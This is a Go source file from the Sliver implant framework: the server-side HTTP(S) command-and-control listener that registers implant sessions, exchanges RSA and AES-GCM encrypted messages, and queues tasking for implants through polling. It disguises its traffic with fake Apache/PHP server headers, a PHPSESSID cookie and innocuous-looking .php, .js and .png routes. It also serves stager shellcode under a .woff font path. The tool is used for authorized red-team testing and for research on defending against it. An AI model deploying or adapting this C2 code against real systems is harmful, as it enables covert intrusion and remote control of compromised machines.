package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	insecureRand "math/rand"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/certs"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
	"github.com/bishopfox/sliver/server/log"
	"github.com/bishopfox/sliver/server/website"
	"github.com/bishopfox/sliver/util/encoders"

	"github.com/golang/protobuf/proto"
	"github.com/gorilla/mux"
)

var (
	httpLog   = log.NamedLogger("c2", "http")
	accessLog = log.NamedLogger("c2", "http-access")
)

const (
	defaultHTTPTimeout = time.Second * 60
	pollTimeout        = defaultHTTPTimeout - 5
	sessionCookieName  = "PHPSESSID"
)

// HTTPSession - Holds data related to a sliver c2 session
type HTTPSession struct {
	ID      string
	Session *core.Session
	Key     cryptography.AESKey
	Started time.Time
	replay  map[string]bool // Sessions are mutex'd
}

// Keeps a hash of each msg in a session to detect replay'd messages
func (s *HTTPSession) isReplayAttack(ciphertext []byte) bool {
	if len(ciphertext) < 1 {
		return false
	}
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	if _, ok := s.replay[digest]; ok {
		return true
	}
	s.replay[digest] = true
	return false
}

// HTTPSessions - All currently open HTTP sessions
type HTTPSessions struct {
	active *map[string]*HTTPSession
	mutex  *sync.RWMutex
}

// Add - Add an HTTP session
func (s *HTTPSessions) Add(session *HTTPSession) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	(*s.active)[session.ID] = session
}

// Get - Get an HTTP session
func (s *HTTPSessions) Get(sessionID string) *HTTPSession {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return (*s.active)[sessionID]
}

// Remove - Remove an HTTP session
func (s *HTTPSessions) Remove(sessionID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete((*s.active), sessionID)
}

// HTTPHandler - Path mapped to a handler function
type HTTPHandler func(resp http.ResponseWriter, req *http.Request)

// HTTPServerConfig - Config data for servers
type HTTPServerConfig struct {
	Addr    string
	LPort   uint16
	Domain  string
	Website string
	Secure  bool
	Cert    []byte
	Key     []byte
	ACME    bool
}

// SliverHTTPC2 - Holds refs to all the C2 objects
type SliverHTTPC2 struct {
	HTTPServer   *http.Server
	Conf         *HTTPServerConfig
	HTTPSessions *HTTPSessions
	SliverStage  []byte // Sliver shellcode to serve during staging process
	Cleanup      func()

	server    string
	poweredBy string
}

func (s *SliverHTTPC2) getServerHeader() string {
	if s.server == "" {
		s.server = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(43))
	}
	return s.server
}

func (s *SliverHTTPC2) getPoweredByHeader() string {
	if s.poweredBy == "" {
		s.poweredBy = fmt.Sprintf("PHP/7.%d.%d",
			insecureRand.Intn(3), insecureRand.Intn(17))
	}
	return s.poweredBy
}

// StartHTTPSListener - Start an HTTP(S) listener, this can be used to start both
//						HTTP/HTTPS depending on the caller's conf
// TODO: Better error handling, configurable ACME host/port
func StartHTTPSListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
	StartPivotListener()
	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
	server := &SliverHTTPC2{
		Conf: conf,
		HTTPSessions: &HTTPSessions{
			active: &map[string]*HTTPSession{},
			mutex:  &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: defaultHTTPTimeout,
		ReadTimeout:  defaultHTTPTimeout,
		IdleTimeout:  defaultHTTPTimeout,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}
	if conf.ACME {
		conf.Domain = filepath.Base(conf.Domain) // I don't think we need this, but we do it anyways
		httpLog.Infof("Attempting to fetch let's encrypt certificate for '%s' ...", conf.Domain)
		acmeManager := certs.GetACMEManager(conf.Domain)
		acmeHTTPServer := &http.Server{Addr: ":80", Handler: acmeManager.HTTPHandler(nil)}
		go acmeHTTPServer.ListenAndServe()
		server.HTTPServer.TLSConfig = &tls.Config{
			GetCertificate: acmeManager.GetCertificate,
		}
		server.Cleanup = func() {
			ctx, cancelHTTP := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTP()
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown http acme server")
			}
			ctx, cancelHTTPS := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTPS()
			server.HTTPServer.Shutdown(ctx)
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown https server")
			}
		}
	} else {
		server.HTTPServer.TLSConfig = getHTTPTLSConfig(conf)
		server.Cleanup = func() {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			server.HTTPServer.Shutdown(ctx)
			if err := server.HTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown https server")
			}
		}
	}
	_, _, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, conf.Domain)
	if err == certs.ErrCertDoesNotExist {
		_, _, err := certs.ServerGenerateRSACertificate(conf.Domain)
		if err != nil {
			httpLog.Errorf("Failed to generate server rsa certificate %s", err)
			return nil, err
		}
	}
	return server, nil
}

func getHTTPTLSConfig(conf *HTTPServerConfig) *tls.Config {
	if conf.Cert == nil || conf.Key == nil {
		var err error
		conf.Cert, conf.Key, err = certs.HTTPSGenerateRSACertificate(conf.Domain)
		if err != nil {
			httpLog.Warnf("Failed to generate self-signed tls cert/key pair %v", err)
			return nil
		}
	}
	cert, err := tls.X509KeyPair(conf.Cert, conf.Key)
	if err != nil {
		httpLog.Warnf("Failed to parse tls cert/key pair %v", err)
		return nil
	}
	return &tls.Config{
		Certificates:             []tls.Certificate{cert},
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		},
	}
}

func (s *SliverHTTPC2) router() *mux.Router {
	router := mux.NewRouter()

	// Procedural C2
	// ===============
	// .txt = rsakey
	// .jsp = start
	// .php = session
	//  .js = poll
	// .png = stop
	// .woff = sliver shellcode

	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
	router.HandleFunc("/{rpath:.*\\.jsp$}", s.startSessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
	// Can't force the user agent on the stager payload
	// Request from msf stager payload will look like:
	// GET /fonts/Inter-Medium.woff/B64_ENCODED_PAYLOAD_UUID
	router.HandleFunc("/{rpath:.*\\.woff[/]{0,1}.*$}", s.stagerHander).Methods(http.MethodGet)

	// Request does not match the C2 profile so we pass it to the static content or 404 handler
	if s.Conf.Website != "" {
		httpLog.Infof("Serving static content from website %v", s.Conf.Website)
		router.HandleFunc("/{rpath:.*}", s.websiteContentHandler).Methods(http.MethodGet)
	} else {
		// 404 Handler - Just 404 on every path that doesn't match another handler
		httpLog.Infof("No website content, using wildcard 404 handler")
		router.HandleFunc("/{rpath:.*}", default404Handler).Methods(http.MethodGet, http.MethodPost)
	}

	router.Use(loggingMiddleware)
	router.Use(s.DefaultRespHeaders)

	return router
}

// This filters requests that do not have a valid nonce
func filterNonce(req *http.Request, rm *mux.RouteMatch) bool {
	qNonce := req.URL.Query().Get("_")
	nonce, err := strconv.Atoi(qNonce)
	if err != nil {
		httpLog.Warnf("Invalid nonce '%s' ignore request", qNonce)
		return false // NaN
	}
	_, _, err = encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Invalid nonce (%d) ignore request", nonce)
		return false // Not a valid encoder
	}
	return true
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		accessLog.Infof("%s - %s - %v", req.RemoteAddr, req.RequestURI, req.Header.Get("User-Agent"))
		next.ServeHTTP(resp, req)
	})
}

// DefaultRespHeaders - Configures default response headers
func (s *SliverHTTPC2) DefaultRespHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		resp.Header().Set("Server", s.getServerHeader())
		resp.Header().Set("X-Powered-By", s.getPoweredByHeader())
		resp.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")

		switch uri := req.URL.Path; {
		case strings.HasSuffix(uri, ".txt"):
			resp.Header().Set("Content-type", "text/plain; charset=utf-8")
		case strings.HasSuffix(uri, ".css"):
			resp.Header().Set("Content-type", "text/css; charset=utf-8")
		case strings.HasSuffix(uri, ".php"):
			resp.Header().Set("Content-type", "text/html; charset=utf-8")
		case strings.HasSuffix(uri, ".js"):
			resp.Header().Set("Content-type", "text/javascript; charset=utf-8")
		case strings.HasSuffix(uri, ".png"):
			resp.Header().Set("Content-type", "image/png")
		default:
			resp.Header().Set("Content-type", "application/octet-stream")
		}

		next.ServeHTTP(resp, req)
	})
}

func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Infof("Request for site %v -> %s", s.Conf.Website, req.RequestURI)
	contentType, content, err := website.GetContent(s.Conf.Website, req.RequestURI)
	if err != nil {
		httpLog.Infof("No website content for %s", req.RequestURI)
		resp.WriteHeader(404) // No content for this path
		return
	}
	resp.Header().Set("Content-type", contentType)
	resp.Write(content)
}

func default404Handler(resp http.ResponseWriter, req *http.Request) {
	resp.WriteHeader(404)
}

// [ HTTP Handlers ] ---------------------------------------------------------------

func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
	qNonce := req.URL.Query().Get("_")
	nonce, err := strconv.Atoi(qNonce)
	certPEM, _, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, s.Conf.Domain)
	if err != nil {
		httpLog.Infof("Failed to get server certificate for cn = '%s': %s", s.Conf.Domain, err)
	}
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Infof("Failed to find encoder from nonce %d", nonce)
	}
	resp.Write(encoder.Encode(certPEM))
}

func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {

	// Note: these are the c2 certificates NOT the certificates/keys used for SSL/TLS
	publicKeyPEM, privateKeyPEM, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, s.Conf.Domain)
	if err != nil {
		httpLog.Info("Failed to fetch rsa private key")
		resp.WriteHeader(404)
		return
	}

	// RSA decrypt request body
	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
	httpLog.Debugf("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)

	nonce, err := strconv.Atoi(req.URL.Query().Get("_"))
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Infof("Request specified an invalid encoder (%d)", nonce)
		resp.WriteHeader(404)
		return
	}
	body, _ := ioutil.ReadAll(req.Body)
	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Errorf("Failed to decode body %s", err)
		resp.WriteHeader(404)
		return
	}

	sessionInitData, err := cryptography.RSADecrypt(data, privateKey)
	if err != nil {
		httpLog.Info("RSA decryption failed")
		resp.WriteHeader(404)
		return
	}
	sessionInit := &sliverpb.HTTPSessionInit{}
	proto.Unmarshal(sessionInitData, sessionInit)

	httpSession := newHTTPSession()
	httpSession.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
	httpSession.Session = core.Sessions.Add(&core.Session{
		ID:            core.NextSessionID(),
		Transport:     "http(s)",
		RemoteAddress: req.RemoteAddr,
		Send:          make(chan *sliverpb.Envelope, 16),
		RespMutex:     &sync.RWMutex{},
		Resp:          map[uint64]chan *sliverpb.Envelope{},
	})
	httpSession.Session.UpdateCheckin()
	s.HTTPSessions.Add(httpSession)
	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)

	ciphertext, err := cryptography.GCMEncrypt(httpSession.Key, []byte(httpSession.ID))
	if err != nil {
		httpLog.Info("Failed to encrypt session identifier")
		resp.WriteHeader(404)
		return
	}
	http.SetCookie(resp, &http.Cookie{
		Domain:   s.Conf.Domain,
		Name:     sessionCookieName,
		Value:    httpSession.ID,
		Secure:   true,
		HttpOnly: true,
	})
	resp.Write(encoder.Encode(ciphertext))
}

func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {

	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		httpLog.Infof("No session with id %#v", httpSession.ID)
		resp.WriteHeader(403)
		return
	}

	nonce, err := strconv.Atoi(req.URL.Query().Get("_"))
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Infof("Request specified an invalid encoder (%d)", nonce)
		resp.WriteHeader(404)
		return
	}
	body, _ := ioutil.ReadAll(req.Body)
	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Errorf("Failed to decode body %s", err)
		resp.WriteHeader(404)
		return
	}

	if httpSession.isReplayAttack(data) {
		httpLog.Warn("Replay attack detected")
		resp.WriteHeader(404)
		return
	}
	plaintext, err := cryptography.GCMDecrypt(httpSession.Key, data)
	if err != nil {
		httpLog.Warnf("GCM decryption failed %v", err)
		resp.WriteHeader(404)
		return
	}
	envelope := &sliverpb.Envelope{}
	proto.Unmarshal(plaintext, envelope)

	handlers := sliverHandlers.GetSessionHandlers()
	if envelope.ID != 0 {
		httpSession.Session.RespMutex.RLock()
		defer httpSession.Session.RespMutex.RUnlock()
		if resp, ok := httpSession.Session.Resp[envelope.ID]; ok {
			resp <- envelope
		}
	} else if handler, ok := handlers[envelope.Type]; ok {
		handler.(func(*core.Session, []byte))(httpSession.Session, envelope.Data)
	}
	resp.WriteHeader(200)
	// TODO: Return random data?
}

func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		httpLog.Infof("No session with id %#v", httpSession.ID)
		resp.WriteHeader(403)
		return
	}

	// We already know we have a valid nonce because of the middleware filter
	nonce, _ := strconv.Atoi(req.URL.Query().Get("_"))
	_, encoder, _ := encoders.EncoderFromNonce(nonce)
	select {
	case envelope := <-httpSession.Session.Send:
		resp.WriteHeader(200)
		envelopeData, _ := proto.Marshal(envelope)
		data, _ := cryptography.GCMEncrypt(httpSession.Key, envelopeData)
		resp.Write(encoder.Encode(data))
	case <-time.After(pollTimeout):
		httpLog.Debug("Poll time out")
		resp.WriteHeader(201)
		resp.Write([]byte{})
	}
}

func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		httpLog.Infof("No session with id %#v", httpSession.ID)
		resp.WriteHeader(403)
		return
	}

	nonce := []byte(req.URL.Query().Get("nonce"))
	if httpSession.isReplayAttack(nonce) {
		httpLog.Warn("Replay attack detected")
		resp.WriteHeader(404)
		return
	}
	_, err := cryptography.GCMDecrypt(httpSession.Key, nonce)
	if err != nil {
		httpLog.Warnf("GCM decryption failed %v", err)
		resp.WriteHeader(404)
		return
	}

	core.Sessions.Remove(httpSession.Session.ID)
	s.HTTPSessions.Remove(httpSession.ID)
	resp.WriteHeader(200)
}

// stagerHander - Serves the sliver shellcode to the stager requesting it
func (s *SliverHTTPC2) stagerHander(resp http.ResponseWriter, req *http.Request) {
	if len(s.SliverStage) != 0 {
		httpLog.Infof("Received staging request from %s", req.RemoteAddr)
		resp.Write(s.SliverStage)
		httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), req.RemoteAddr)
		resp.WriteHeader(200)
	} else {
		resp.WriteHeader(404)
	}
}

func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
		if cookie.Name == sessionCookieName {
			httpSession := s.HTTPSessions.Get(cookie.Value)
			if httpSession != nil {
				httpSession.Session.UpdateCheckin()
				return httpSession
			}
			return nil
		}
	}
	return nil // No valid cookie names
}

func newHTTPSession() *HTTPSession {
	return &HTTPSession{
		ID:      newHTTPSessionID(),
		Started: time.Now(),
		replay:  map[string]bool{},
	}
}

// newHTTPSessionID - Get a 128bit session ID
func newHTTPSessionID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}
